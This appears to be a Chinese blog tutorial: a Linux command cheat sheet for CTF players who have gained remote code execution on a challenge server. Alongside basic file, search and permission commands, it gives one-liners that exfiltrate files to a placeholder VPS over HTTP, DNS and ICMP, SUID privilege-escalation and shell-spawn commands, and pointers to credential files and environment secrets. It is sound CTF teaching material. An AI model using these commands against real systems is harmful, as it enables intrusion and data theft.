---
title: Linux 基础知识
date: 2026-07-15
categories: [web安全, 常用命令]
recommend: 95
type: tech
permalink: /web-security/commands/linux
---

# Linux 基础知识（CTF 实战版）

> 做 Web CTF 经常需要进到服务器里找 flag。Linux 命令不用全学，掌握这里列的就够用。

---

## 场景：拿到 RCE 后怎么办？

假设你通过命令注入拿到了服务器执行权限，输入 `whoami` 返回 `www-data`。接下来呢？

```
1. 看看在哪：pwd
2. 看看有啥：ls -la
3. 找 flag：find / -name "*flag*" 2>/dev/null
4. 读 flag：cat /flag
5. 权限不够？ls -l /flag → 看是谁的、什么权限
```

---

## 一、核心目录速查

| 目录 | 是什么 | CTF 中的意义 |
|:----:|--------|:-----------:|
| `/` | 根目录 | 一切的起点 |
| `/flag`、`/flag.txt`、`/readflag` | CTF 常见 flag 位置 |  第一目标 |
| `/var/www/html` | Apache 默认网站根目录 | 源码在这里 |
| `/usr/share/nginx/html` | Nginx 默认目录 | 同上 |
| `/app` | Docker 容器常见项目目录 | 容器题的源码位置 |
| `/tmp` | 临时目录 |**可写！**常用于上传文件 |
| `/dev/shm` | 共享内存（也是可写目录） | 比 /tmp 更快 |
| `/etc/passwd` | 系统用户信息 | 验证路径穿越 |
| `/etc/shadow` | 密码哈希 | 需要 root 权限 |
| `/proc/self/environ` | 当前进程环境变量 | 可能含密钥 |
| `/proc/1/cgroup` | 容器信息 | 判断是否在 Docker 里 |
| `/proc/self/cmdline` | 当前进程启动命令 | 看看服务怎么启动的 |
| `/root/.bash_history` | root 的命令历史 | 可能泄露密码/路径 |
| `/home/*/.bash_history` | 普通用户命令历史 | 同上 |
| `/.dockerenv` | Docker 标记文件 | 存在 = 在容器中 |
| `/proc/self/status` | 进程状态信息 | 查看 Capabilities |

---

## 二、常用命令速查

### 2.1 文件与目录操作

```bash
ls                  # 列出当前目录
ls -la              # 列出所有文件（含隐藏文件）+ 详细权限
ls -la /var/www/    # 列出指定目录
pwd                 # 显示当前所在路径
cd /var/www/html    # 切换目录
cd ..               # 返回上一级
```

**ls 命令详细参数**：

| 参数 | 作用 | 示例 |
|:----:|:----:|:----:|
| `-l` | 详细列表（权限、所有者、大小、时间） | `ls -l` |
| `-a` | 显示隐藏文件（以 `.` 开头的文件） | `ls -la` |
| `-h` | 人类可读的文件大小（KB, MB） | `ls -lh` |
| `-t` | 按修改时间排序 | `ls -lt` |
| `-r` | 反向排序 | `ls -ltr` |
| `-S` | 按文件大小排序 | `ls -lS` |
| `-R` | 递归列出子目录 | `ls -lR` |

### 2.2 查看文件内容

```bash
cat /flag                     # 查看文件全部内容（最常用）
head -20 /etc/passwd          # 只看前 20 行
tail -30 /var/log/apache2/access.log  # 只看最后 30 行
strings 二进制文件 | head -50          # 从二进制中提取可读文本
tac /flag                     # 反向显示（cat 倒过来）
nl /flag                      # 显示行号
less /flag                    # 分页查看（适合大文件）
more /flag                    # 分页查看（更简单的版本）
```

### 2.3 搜索——CTF 核心技能

#### 按文件名搜索（find）

| 命令 | 作用 |
|:----|:----|
| `find / -name "flag*" 2>/dev/null` | 全盘搜索 flag 开头的文件 |
| `find / -name "*.txt" 2>/dev/null` | 搜索所有 txt 文件 |
| `find / -name "*conf*" 2>/dev/null` | 搜索配置相关文件 |
| `find / -size -200c 2>/dev/null` | 搜索小于 200 字节的文件 |
| `find / -mtime -1 2>/dev/null` | 搜索最近 24 小时内修改的文件 |
| `find / -perm -4000 -type f 2>/dev/null` | 搜索 SUID 文件（提权） |
| `find / -perm -2000 -type f 2>/dev/null` | 搜索 SGID 文件 |
| `find /var/www/ -name "*.php" 2>/dev/null` | 搜索 Web 目录下所有 PHP 文件 |
| `find / -writable -type f 2>/dev/null` | 搜索可写的文件（权限绕过） |
| `find / -readable -type f 2>/dev/null \| head -20` | 搜索可读的文件 |

**find 的参数组合**：

```bash
# 按类型搜索
find / -type f          # 只搜索普通文件
find / -type d          # 只搜索目录

# 按权限搜索
find / -perm -4000      # 包含 SUID（4xxx）
find / -perm -2000      # 包含 SGID（2xxx）
find / -perm -6000      # 包含 SUID + SGID
find / -perm /4000      # 任一用户含 SUID

# 按时间和大小组合
find / -mmin -10                         # 10分钟内修改
find / -size +100M -size -200M           # 100MB~200MB之间
find / -name "*.log" -mtime -7           # 7天内修改的日志
```

#### 按内容搜索（grep）

| 命令 | 作用 |
|:----|:----|
| `grep -r "flag{" /var/www/html/ 2>/dev/null` | 递归搜索包含 flag{ 的文件 |
| `grep -r -E "(password\|secret\|key)" /var/www/ 2>/dev/null` | 搜索敏感关键词 |
| `grep -r "flag{" /tmp/ 2>/dev/null` | 临时目录也不放过 |
| `grep -rn "flag{" / 2>/dev/null` | 显示行号 |
| `grep -ril "flag{" / 2>/dev/null` | 只显示文件名（不显示内容） |
| `grep -r "<?php" /var/www/ 2>/dev/null` | 搜索 PHP 文件 |

**grep 常用参数**：

| 参数 | 作用 | 示例 |
|:----:|:----:|:----:|
| `-r` | 递归搜索 | `grep -r "flag{" /` |
| `-i` | 忽略大小写 | `grep -ri "flag" /` |
| `-n` | 显示行号 | `grep -rn "key" /` |
| `-l` | 只显示文件名 | `grep -rl "flag{" /` |
| `-E` | 使用扩展正则 | `grep -rE "flag\|secret\|key" /` |
| `-w` | 匹配完整单词 | `grep -rw "admin" /` |

#### 组合搜索（管道）

```bash
find / -name "*.txt" 2>/dev/null | xargs grep "flag{" 2>/dev/null
cat /etc/passwd | grep -E "bash|sh$"                  # 找有 shell 权限的用户
ls -la /var/www/html/ | grep "flag"                    # 在文件列表里搜
ps aux | grep "flag"                                   # 找进程中的 flag
```

### 2.4 当前用户信息

```bash
whoami          # 我是谁 → 如 www-data
id              # 详细信息 → uid、gid、所有用户组
env             # 所有环境变量（重点关注 SECRET、PASSWORD、FLAG）
sudo -l         # 我能用 sudo 执行什么？（提权关键！）
```

#### id 命令输出详解

```bash
$ id
uid=1000(www-data) gid=1000(www-data) groups=1000(www-data),27(sudo)
```

| 输出部分 | 含义 |
|:--------:|:----:|
| `uid=1000(www-data)` | 用户 ID 和用户名 |
| `gid=1000(www-data)` | 主组 ID 和组名 |
| `groups=1000(www-data),27(sudo)` | 所属的所有组（sudo 组可提权） |

### 2.5 网络相关

```bash
# 查看网络连接和监听端口
netstat -tulpn                     # 列出所有监听端口
ss -tulpn                          # 现代版 netstat

# 查看网络接口
ip addr                            # IP 地址信息
ifconfig                           # 旧版

# DNS 查询
host target.com                    # 域名解析
nslookup target.com                # 详细 DNS 查询

# HTTP 请求
curl -v http://target/             # 发送 HTTP 请求
wget -O- http://target/            # 下载到 stdout
```

### 2.6 进程相关

```bash
ps aux                             # 查看所有运行进程
ps aux | grep flag                 # 找含 flag 的进程
top -bn1                           # 一次性查看进程列表（非交互）
pgrep -a "python"                  # 按名称查找进程
```

---

## 三、文件权限——读 flag 经常卡在这里

### 3.1 看懂权限

```bash
ls -l /flag
# 输出：-rw-r--r-- 1 root root 42 Jul 22 10:00 /flag
# ├─┘├─────┤   ├──┘ ├──┘
# 类型 权限    所有者 所属组
```

**10 位权限拆解：**

```
位置： 1   2-4   5-7   8-10
含义：类型 所有者 所属组 其他人
示例： -    rw-   r--   r--
```

| 字符 | 含义 |
|:----:|:----:|
| `r` | 可读（read） |
| `w` | 可写（write） |
| `x` | 可执行（execute） |
| `-` | 没有该权限 |

#### 文件类型标志（第 1 位）

| 字符 | 含义 |
|:----:|:----:|
| `-` | 普通文件 |
| `d` | 目录 |
| `l` | 符号链接 |
| `s` | Socket |
| `b` | 块设备 |
| `c` | 字符设备 |

#### 特殊权限标志（x 位置）

| 位置 | 字符 | 含义 |
|:----:|:----:|:----:|
| 所有者 x | `s`（小写） | SUID（文件所有者是 root 时，执行者成 root） |
| 所有者 x | `S`（大写） | SUID + x 未设置（罕见） |
| 所属组 x | `s`（小写） | SGID |
| 所属组 x | `S`（大写） | SGID + x 未设置 |
| 其他人 x | `t`（小写） | 粘滞位（sticky bit） |
| 其他人 x | `T`（大写） | 粘滞位 + x 未设置 |

**数字权限速算：** `r=4, w=2, x=1`，相加即可。

| 数字 | 权限 | 含义 |
|:----:|:----:|:----:|
| 7 | rwx | 读+写+执行 |
| 6 | rw- | 读+写 |
| 5 | r-x | 读+执行 |
| 4 | r-- | 只读 |
| 0 | --- | 无权限 |

**4 位数字权限**：

| 数字 | 含义 | 示例 |
|:----:|:----:|:----:|
| 4xxx | SUID | `4755` = SUID + rwxr-xr-x |
| 2xxx | SGID | `2755` = SGID + rwxr-xr-x |
| 1xxx | Sticky | `1755` = Sticky + rwxr-xr-x |
| 0xxx | 无特殊 | `0755` = rwxr-xr-x |

### 3.2 权限问题的 CTF 场景

```
场景1：cat /flag → Permission denied
       ↓ ls -l /flag
       -r-------- 1 root root 42 /flag
       ↓ 只有 root 能读，www-data 不行
       ↓ 思路：找 SUID 提权 / 换路径 / 用其他漏洞

场景2：rwx 中带 s 标志（SUID）
       -rwsr-xr-x 1 root root /readflag
       ↓ 谁执行都临时以 root 权限运行！
       ↓ /readflag → 直接读到 flag

场景3：查找所有 SUID 文件
       find / -perm -4000 -type f 2>/dev/null

场景4：查找所有 SGID 文件
       find / -perm -2000 -type f 2>/dev/null
```

### 3.3 修改权限

```bash
chmod +x shell.sh           # 加执行权限
chmod 777 file.txt          # 所有人可读写执行
chown www-data:www-data file.txt  # 改所有者:所属组
```

**chmod 符号模式**：

| 符号 | 含义 |
|:----:|:----:|
| `u` | 所有者（user） |
| `g` | 所属组（group） |
| `o` | 其他人（other） |
| `a` | 全部（all） |
| `+` | 增加权限 |
| `-` | 删除权限 |
| `=` | 设置为指定权限 |

示例：
```bash
chmod u+x file      # 给所有者加执行权限
chmod go-w file     # 去掉组和其他人的写权限
chmod a+x file      # 给所有人加执行权限
```

---

## 四、管道与重定向详解

### 4.1 管道

管道 `|` 把左边命令的**标准输出**交给右边命令的**标准输入**。

```
命令1 的标准输出 →|→ 命令2 的标准输入
```

```bash
# 基础用法
cat /etc/passwd | grep root          # 筛选含 root 的行
ls -la | head -5                     # 只列出前 5 行
ps aux | grep "www-data"             # 找 www-data 的进程

# 链式管道
cat /flag | base64                   # 把 flag 转成 base64
cat /etc/passwd | grep -E "bash|sh"  # 找有 shell 的用户
find / -name "*.php" | xargs grep "flag{"  # 在 PHP 文件中搜 flag
```

### 4.2 重定向

| 写法 | 含义 | 内存术语 |
|:----:|:----:|:--------:|
| `command > file` | 标准输出 → 覆盖写入文件 | stdout → file |
| `command >> file` | 标准输出 → 追加写入文件 | stdout → file (append) |
| `command 2> file` | 标准错误 → 覆盖写入文件 | stderr → file |
| `command 2>&1` | 标准错误 → 合并到标准输出 | stderr → stdout |
| `command > /dev/null 2>&1` | 丢弃所有输出 | discard both |
| `command < file` | 从文件读取输入 | file → stdin |
| `command << EOF` | Here Document（多行输入） | inline → stdin |
| `command 1>&2` | 标准输出 → 合并到标准错误 | stdout → stderr |

**详细解释**：

标准输入（stdin）= 文件描述符 0
标准输出（stdout）= 文件描述符 1
标准错误（stderr）= 文件描述符 2

```bash
# 例1：保存结果，忽略错误
find / -name "flag*" > result.txt 2>/dev/null

# 例2：同时保存 stdout 和 stderr 到不同文件
find / -name "flag*" > found.txt 2>error.txt

# 例3：同时追加 stdout 和 stderr 到同一文件
find / -name "flag*" >> all.log 2>&1

# 例4：从文件读取输入
sort < names.txt

# 例5：Here Document 写入文件
cat > config.php << 'EOF'
<?php
$flag = "flag{test}";
EOF
```

### 4.3 CTF 外带数据

```bash
# 方式1：curl POST 外带
cat /flag | curl -d @- http://你的VPS/

# 方式2：base64 + curl
cat /flag | base64 | curl -d @- http://你的VPS/xss.php

# 方式3：wget POST 外带
cat /flag | base64 | wget --post-data @- http://你的VPS/

# 方式4：DNS 外带（如果 HTTP 被禁）
cat /flag | base64 | while read line; do host "$line.你的域名" 2>/dev/null; done

# 方式5：ICMP 外带
cat /flag | xxd -p -c 32 | while read line; do ping -c 1 -p $line 你的VPS; done
```

---

## 五、CTF flag 搜索实战

### 完整 flag 搜索流程

```bash
# === 第一优先级：直接读 ===
cat /flag
cat /flag.txt
cat /readflag
/readflag                     # 可能是 SUID 可执行文件

# === 第二优先级：全盘搜索 ===
find / -name "*flag*" 2>/dev/null
find / -name "*flag*" -type f 2>/dev/null  # 只找文件
find / -name "*flag*" -type f -readable 2>/dev/null  # 只找可读的

# === 第三优先级：搜内容 ===
grep -r "flag{" / 2>/dev/null
grep -r "flag{" /var/www/html/ 2>/dev/null
grep -r "flag" /etc/ 2>/dev/null

# === 第四优先级：搜环境变量 ===
env | grep -i flag
env | grep -i secret
env | grep -i key
env | grep -i pass
echo $FLAG
echo $SECRET

# === 第五优先级：命令历史 ===
cat ~/.bash_history | grep -i flag
cat /root/.bash_history 2>/dev/null | grep -i flag
cat ~/.bashrc | grep -i flag

# === 第六优先级：进程内存 ===
ps aux | grep flag              # flag 可能在进程命令行中
cat /proc/*/cmdline 2>/dev/null | grep -i flag

# === 第七优先级：配置文件 ===
cat /etc/flag.conf 2>/dev/null
cat /etc/flag 2>/dev/null
ls -la /etc/ | grep -i flag

# === 特殊：容器环境 ===
cat /proc/1/cgroup | grep docker    # 判断是否在容器中
ls -la /.dockerenv 2>/dev/null       # Docker 标记文件
```

### 判断容器环境

| 检查点 | 命令 | 容器中 | 非容器 |
|:------:|:----:|:------:|:------:|
| cgroup | `cat /proc/1/cgroup` | 包含 `docker` | 不含 |
| dockerenv | `ls /.dockerenv` | 存在 | 不存在 |
| 主机名 | `hostname` | 通常是容器 ID | 正常名称 |
| /proc/1/sched | `cat /proc/1/sched` | 名称不同 | `init` 或 `systemd` |

### CTF 常用敏感文件路径

| 路径 | 可能包含的内容 |
|:----:|:-------------:|
| `/flag` | 最常见的 flag 位置 |
| `/flag.txt` | 另一种常见位置 |
| `/readflag` | 需要执行的 SUID 程序 |
| `/var/www/html/flag` | Web 目录下的 flag |
| `/home/ctf/flag` | CTF 用户目录 |
| `/root/flag` | root 目录下的 flag |
| `/tmp/flag` | 临时目录 |
| `/proc/self/fd/1` | 进程的标准输出 |
| `/var/log/auth.log` | SSH 登录日志（含密码） |
| `/etc/shadow` | 用户密码哈希 |

---

## 六、SUID 提权速查

### 6.1 什么是 SUID

SUID（Set User ID）是一种特殊权限，当文件设置了 SUID 后，无论谁执行它，都会以**文件所有者**的身份运行。

```
-rwsr-xr-x 1 root root 31000 /usr/bin/su
  ↑
  s = SUID 标志
```

### 6.2 查找 SUID 文件

```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 查找 SUID + SGID
find / -perm -6000 -type f 2>/dev/null

# 查找当前用户可执行的 SUID
find / -perm -4000 -type f -executable 2>/dev/null
```

### 6.3 常见 SUID 提权命令

| 命令 | 提权方式 | 示例 |
|:----:|:--------|:----:|
| `find` | 执行任意命令 | `find / -exec whoami \;` |
| `vim` / `vi` | 编辑文件 | `vim /etc/passwd` |
| `nmap` | 执行脚本 | `nmap --script=xxx` |
| `less` / `more` | 进入 shell | `less /etc/passwd` → `!sh` |
| `awk` | 执行命令 | `awk 'BEGIN{system("whoami")}'` |
| `python` | 执行 Python | `python -c 'import os; os.system("/bin/sh")'` |
| `perl` | 执行 Perl | `perl -e 'exec "/bin/sh";'` |
| `tcpdump` | 执行命令 | `tcpdump -i lo -w /tmp/pcap` |
| `cp` | 复制文件 | `cp /flag /tmp/flag` |
| `base64` | 读文件 | `base64 /flag` |

### 6.4 示例：利用 find SUID 提权

```bash
# 如果 find 有 SUID 权限
/usr/bin/find /home -exec sh -p \;   # -p 保留提权权限
```

### 6.5 查询可执行文件的 Capabilities

```bash
# 查看某个文件的 capabilities
getcap /usr/bin/python3
getcap -r /usr/bin/   # 查看某个目录下所有文件的 capabilities
```

Capabilities 是更细粒度的权限控制，常见的有：

| Capability | 作用 | 示例命令 |
|:----------:|:----:|:--------:|
| `cap_setuid+ep` | 允许设置用户 ID | 可用来提权 |
| `cap_net_raw+ep` | 允许原始 socket | `ping` |
| `cap_dac_override+ep` | 绕过文件权限检查 | 可读任意文件 |

---

## 知识总结

### 命令速查表

| 任务 | 命令 |
|:----|:----|
| 列出文件 | `ls -la` |
| 查看文件 | `cat`、`head`、`tail` |
| 搜索文件名 | `find / -name "xxx" 2>/dev/null` |
| 搜索文件内容 | `grep -r "xxx" /path 2>/dev/null` |
| 我是谁 | `whoami`、`id` |
| 权限查看 | `ls -l /flag` |
| SUID 提权 | `find / -perm -4000 2>/dev/null` |
| 环境变量 | `env`、`env \| grep -i flag` |
| 容器判断 | `cat /proc/1/cgroup` |
| 网络监听 | `netstat -tulpn` |
| 进程列表 | `ps aux` |
| 从二进制提取文本 | `strings binfile` |

### 文件搜索优先级

| 优先级 | 方法 | 命令 |
|:-----:|:----:|:----:|
| 1 | 直接尝试 | `cat /flag` `cat /flag.txt` `/readflag` |
| 2 | 按文件名 | `find / -name "*flag*"` |
| 3 | 按内容 | `grep -r "flag{" /` |
| 4 | 环境变量 | `env \| grep flag` |
| 5 | 命令历史 | `cat ~/.bash_history` |
| 6 | 进程信息 | `ps aux \| grep flag` |
| 7 | Docker 卷 | `ls /var/lib/docker/volumes/` |

### 权限数字速算

| 权限 | 数字 |
|:----:|:----:|
| `r--` | 4 |
| `rw-` | 6 |
| `rwx` | 7 |
| `r-x` | 5 |
| `rws` | 4+7=4755（SUID） |
| `r-x` | 5 |

### 管道重定向速查

| 写法 | 含义 |
|:----|:----|
| `cmd1 \| cmd2` | 管道 |
| `cmd > file` | 覆盖写入 |
| `cmd >> file` | 追加写入 |
| `cmd 2> file` | 错误写入 |
| `cmd 2>&1` | 错误合并到输出 |
| `cmd > /dev/null 2>&1` | 丢弃全部 |

>**新手避坑**：
> - `2>/dev/null` 是把错误信息丢掉（比如"权限不够"），这样搜索结果更干净。不加的话屏幕会被大量 "Permission denied" 刷屏
> - `line.strip()` 会删掉密码前后的空格，读字典时用 `line.rstrip("\r\n")`
> - SUID 文件用 `find -perm -4000` 查找，不是 `find -perm 4000`（少了个 `-`）
> - `cat /flag` 不行记得试试 `/readflag`，可能是 SUID 程序
> - 在容器中 `systemctl` 通常不可用
> - `python -c 'import pty; pty.spawn("/bin/bash")'` 可以升级 TTY shell
> - `script -qc /dev/null /dev/null` 也是一条 TTY 升级命令
> - 用 `curl -s` 或 `wget -qO-` 代替 `curl` 可以让 HTTP 请求不打印进度条
> - 环境变量中搜 flag 别忘了 `echo $FLAG`、`printenv`、`declare -x`
> - `cat /proc/1/environ` 可能暴露容器启动时的环境变量
> - `ls -la /proc/*/exe` 可以查看所有进程的可执行文件路径
> - 如果 `/bin/sh` 被限制，尝试 `python3 -c 'import os; os.system("/bin/bash")'` 或 `busybox sh`
